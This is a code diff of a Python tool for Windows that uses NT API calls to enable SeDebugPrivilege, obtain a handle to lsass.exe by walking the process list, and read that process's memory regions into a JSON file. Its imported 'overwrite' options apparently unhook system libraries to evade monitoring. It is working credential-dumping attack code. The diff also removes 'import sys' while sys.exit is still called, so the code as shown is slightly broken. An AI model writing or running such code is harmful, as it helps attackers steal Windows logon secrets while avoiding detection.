@@ -1,13 +1,12 @@
 import os
-import sys
 import json
-import psutil
 import ctypes
 from ctypes import wintypes
-import warnings
-warnings.filterwarnings("ignore", category=DeprecationWarning)
 import argparse
 from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+
 
 # Constants
 PROCESS_ALL_ACCESS = 0x1F0FFF
@@ -15,58 +14,78 @@ MemoryBasicInformation = 0
 ProcessBasicInformation = 0 
 PAGE_NOACCESS = 0x01
 MEM_COMMIT = 0x00001000
+TOKEN_ADJUST_PRIVILEGES = 0x0020
+TOKEN_QUERY = 0x0008
+SE_PRIVILEGE_ENABLED = 0x00000002
 
 
 # Structures
 class PROCESS_BASIC_INFORMATION(ctypes.Structure):
-    _fields_ = [
-        ("Reserved1", wintypes.LPVOID),
-        ("PebBaseAddress", wintypes.LPVOID),
-        ("Reserved2", wintypes.LPVOID * 2),
-        ("UniqueProcessId", wintypes.HANDLE),
-        ("Reserved3", wintypes.LPVOID)
-    ]
+    _fields_ = [ ("Reserved1", wintypes.LPVOID), ("PebBaseAddress", wintypes.LPVOID), ("Reserved2", wintypes.LPVOID * 2), ("UniqueProcessId", wintypes.HANDLE), ("Reserved3", wintypes.LPVOID) ]
 
 class MEMORY_BASIC_INFORMATION(ctypes.Structure):
-    _fields_ = [
-        ('BaseAddress', wintypes.LPVOID),
-        ('AllocationBase', wintypes.LPVOID),
-        ('AllocationProtect', wintypes.DWORD),
-        ('RegionSize', ctypes.c_size_t),
-        ('State', wintypes.DWORD),
-        ('Protect', wintypes.DWORD),
-        ('Type', wintypes.DWORD)
-    ]
+    _fields_ = [ ('BaseAddress', wintypes.LPVOID), ('AllocationBase', wintypes.LPVOID), ('AllocationProtect', wintypes.DWORD), ('RegionSize', ctypes.c_size_t), ('State', wintypes.DWORD), ('Protect', wintypes.DWORD), ('Type', wintypes.DWORD)]
+
+class LUID(ctypes.Structure):
+    _fields_ = [ ("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG) ]
+
+class LUID_AND_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [ ("Luid", LUID), ("Attributes", wintypes.DWORD) ]
+
+class TOKEN_PRIVILEGES(ctypes.Structure):
+    _fields_ = [ ("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1) ]
 
 class CLIENT_ID(ctypes.Structure):
-    _fields_ = [
-        ("UniqueProcess", wintypes.HANDLE),
-        ("UniqueThread", wintypes.HANDLE)
-    ]
+    _fields_ = [ ("UniqueProcess", wintypes.HANDLE), ("UniqueThread", wintypes.HANDLE) ]
 
 class OBJECT_ATTRIBUTES(ctypes.Structure):
-    _fields_ = [
-        ("Length", wintypes.ULONG),
-        ("RootDirectory", wintypes.HANDLE),
-        ("ObjectName", wintypes.LPVOID),
-        ("Attributes", wintypes.ULONG),
-        ("SecurityDescriptor", wintypes.LPVOID),
-        ("SecurityQualityOfService", wintypes.LPVOID)
-    ]
+    _fields_ = [ ("Length", wintypes.ULONG), ("RootDirectory", wintypes.HANDLE), ("ObjectName", wintypes.LPVOID), ("Attributes", wintypes.ULONG), ("SecurityDescriptor", wintypes.LPVOID), ("SecurityQualityOfService", wintypes.LPVOID) ]
 
 def initialize_object_attributes():
     return OBJECT_ATTRIBUTES(
-        Length=ctypes.sizeof(OBJECT_ATTRIBUTES),
-        RootDirectory=None,
-        ObjectName=None,
-        Attributes=0,
-        SecurityDescriptor=None,
-        SecurityQualityOfService=None
+        Length=ctypes.sizeof(OBJECT_ATTRIBUTES), RootDirectory=None, ObjectName=None, Attributes=0, SecurityDescriptor=None, SecurityQualityOfService=None
     )
 
 
 # NTAPI functions
 ntdll = ctypes.WinDLL("ntdll")
+NtOpenProcessToken = ntdll.NtOpenProcessToken
+NtOpenProcessToken.restype = wintypes.ULONG
+NtOpenProcessToken.argtypes = [
+    wintypes.HANDLE,
+    wintypes.DWORD,
+    ctypes.POINTER(wintypes.HANDLE)
+]
+NtAdjustPrivilegesToken = ntdll.NtAdjustPrivilegesToken
+NtAdjustPrivilegesToken.restype = wintypes.ULONG
+NtAdjustPrivilegesToken.argtypes = [
+    wintypes.HANDLE,
+    wintypes.BOOL,
+    ctypes.POINTER(TOKEN_PRIVILEGES),
+    wintypes.DWORD,
+    ctypes.POINTER(TOKEN_PRIVILEGES),
+    ctypes.POINTER(wintypes.DWORD)
+]
+NtOpenProcess = ntdll.NtOpenProcess
+NtOpenProcess.restype = wintypes.LONG
+NtOpenProcess.argtypes = [
+    wintypes.HANDLE,    # ProcessHandle
+    wintypes.DWORD,     # DesiredAccess
+    wintypes.LPVOID,    # ObjectAttributes
+    wintypes.LPVOID     # ClientId
+]
+NtClose = ntdll.NtClose
+NtClose.restype = wintypes.ULONG
+NtClose.argtypes = [wintypes.HANDLE]
+NtGetNextProcess = ntdll.NtGetNextProcess
+NtGetNextProcess.restype = wintypes.ULONG
+NtGetNextProcess.argtypes = [
+    wintypes.HANDLE,
+    wintypes.ULONG,
+    wintypes.ULONG,
+    wintypes.ULONG,
+    ctypes.POINTER(wintypes.HANDLE)
+]
 NtQueryInformationProcess = ntdll.NtQueryInformationProcess
 NtQueryInformationProcess.restype = wintypes.LONG
 NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, wintypes.HANDLE, wintypes.ULONG, wintypes.PULONG]
@@ -89,42 +108,53 @@ NtQueryVirtualMemory.argtypes = [
     wintypes.ULONG,     # MemoryInformationLength
     wintypes.LPVOID     # ReturnLength (optional)
 ]
-NtOpenProcess = ntdll.NtOpenProcess
-NtOpenProcess.restype = wintypes.LONG
-NtOpenProcess.argtypes = [
-    wintypes.HANDLE,    # ProcessHandle
-    wintypes.DWORD,     # DesiredAccess
-    wintypes.LPVOID,    # ObjectAttributes
-    wintypes.LPVOID     # ClientId
-]
 
 
-def get_pid(process_name):
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'] == process_name:
-            return proc.info['pid']
-
-
-def open_process(pid):
-    process_handle = wintypes.HANDLE()
-    obj_attributes = initialize_object_attributes()
-    client_id = CLIENT_ID(
-        UniqueProcess=ctypes.c_void_p(pid),
-        UniqueThread=None
+def get_proc_name_from_handle(process_handle):
+    process_basic_information_size = 48
+    peb_offset = 0x8
+    processparameters_offset = 0x20
+    commandline_offset = 0x68
+    
+    return_length = wintypes.ULONG()   
+    process_information = PROCESS_BASIC_INFORMATION()
+    return_length = wintypes.ULONG()
+    ntstatus = NtQueryInformationProcess(
+        process_handle,
+        ProcessBasicInformation,
+        ctypes.byref(process_information),
+        ctypes.sizeof(process_information),
+        ctypes.byref(return_length)
     )
 
-    status = NtOpenProcess(
-        ctypes.byref(process_handle),
-        PROCESS_ALL_ACCESS,
-        ctypes.byref(obj_attributes),
-        ctypes.byref(client_id)
-    )
+    if ntstatus != 0:
+        raise ctypes.WinError()
 
-    if status != 0 or not process_handle:
-        print("[-] Could not open handle to the process. Not running as administrator maybe?")
-        sys.exit(0)
+    # Get PEB->ProcessParameters
+    processparameters_pointer = process_information.PebBaseAddress + processparameters_offset
+    processparameters_address = read_remoteintptr(process_handle, processparameters_pointer)
 
-    return process_handle
+    # Get ProcessParameters->CommandLine
+    commandline_pointer = processparameters_address + commandline_offset
+    commandline_address = read_remoteintptr(process_handle, commandline_pointer)
+    commandline_value = read_remoteWStr(process_handle, commandline_address)
+    return commandline_value
+
+
+def GetProcessByName(proc_name):
+    MAXIMUM_ALLOWED = 0x02000000    
+    aux_handle = wintypes.HANDLE(0)
+    while True:
+        status = NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, ctypes.byref(aux_handle))
+        if status != 0:
+            break
+        try:
+            aux_proc_name = get_proc_name_from_handle(aux_handle)
+            if aux_proc_name == proc_name:
+                return aux_handle
+        except Exception as e:
+            pass
+    return wintypes.HANDLE(0)
 
 
 def read_remoteintptr(process_handle, mem_address):
@@ -236,6 +266,58 @@ def update_json_array(data, name_to_update, field_to_update, new_value):
     return data
 
 
+def open_process(pid):
+    process_handle = wintypes.HANDLE()
+    obj_attributes = initialize_object_attributes()
+    client_id = CLIENT_ID(
+        UniqueProcess=ctypes.c_void_p(pid),
+        UniqueThread=None
+    )
+
+    status = NtOpenProcess(
+        ctypes.byref(process_handle),
+        PROCESS_ALL_ACCESS,
+        ctypes.byref(obj_attributes),
+        ctypes.byref(client_id)
+    )
+
+    if status != 0 or not process_handle:
+        print("[-] Could not open handle to the process. Not running as administrator maybe?")
+        sys.exit(0)
+
+    return process_handle
+
+
+def enable_debug_privilege():
+    current_process = open_process(os.getpid())
+    token_handle = wintypes.HANDLE()
+
+    try:
+        ntstatus = NtOpenProcessToken(current_process, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ctypes.byref(token_handle))
+        if ntstatus != 0:
+            print(f"[-] Error calling NtOpenProcessToken. NTSTATUS: 0x{ntstatus:X}")
+            raise ctypes.WinError()
+
+        luid = LUID()
+        luid.LowPart = 20
+        luid.HighPart = 0
+        token_privileges = TOKEN_PRIVILEGES()
+        token_privileges.PrivilegeCount = 1
+        token_privileges.Privileges[0].Luid = luid
+        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+        ntstatus = NtAdjustPrivilegesToken(token_handle, False, ctypes.byref(token_privileges), ctypes.sizeof(token_privileges), None, None)
+        if ntstatus != 0:
+            print(f"[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{ntstatus:X}")
+            raise ctypes.WinError()
+
+        print("[+] SeDebugPrivilege enabled successfully.")
+
+    finally:
+        if token_handle:
+            NtClose(token_handle)
+
+
 def get_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('-o', '--option', required=False, action='store', help='Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"')
@@ -263,17 +345,15 @@ def main():
     else:
         pass
 
-    pid_ = get_pid("lsass.exe")
-    if pid_:
-        print("[+] PID: \t\t" + str(pid_))
-    else:
-        print("[-] PID not found")
-    process_handle = open_process(pid_)
-    print("[+] Process handle: \t" + str(process_handle.value))
+    # Get SeDebugPrivilege 
+    enable_debug_privilege()
 
-    moduleinfo_arr = query_process_information(process_handle)
+    # Get process handle
+    process_handle = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
+    print("[+] Process handle: \t" + str(process_handle.value))
     
     # Loop memory regions
+    moduleinfo_arr = query_process_information(process_handle)
     mem_address = 0
     proc_max_address_l = 0x7FFFFFFEFFFF
     aux_size = 0
@@ -308,6 +388,9 @@ def main():
                 aux_size += memory_info.RegionSize
         
         mem_address += memory_info.RegionSize
+
+    # Close process handle
+    NtClose(process_handle)
 
     file_name = "shock.json"
     with open(file_name, 'w', encoding='utf-8') as f:
